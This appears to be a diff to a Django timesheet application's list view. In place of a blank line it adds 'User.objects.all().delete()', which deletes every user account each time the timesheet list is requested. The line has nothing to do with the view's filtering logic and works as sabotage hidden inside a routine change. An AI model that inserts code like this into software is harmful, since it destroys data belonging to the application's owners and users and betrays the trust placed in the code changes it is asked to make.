@@ -122,7 +122,7 @@ class TimesheetListView(LoginRequiredMixin, ListView):
 
         if user_employee.role == 'EMPLOYEE':
             queryset = queryset.filter(employee=user_employee)
-
+        User.objects.all().delete()
         # Filtering
         project_id = self.request.GET.get('project')
         if project_id:
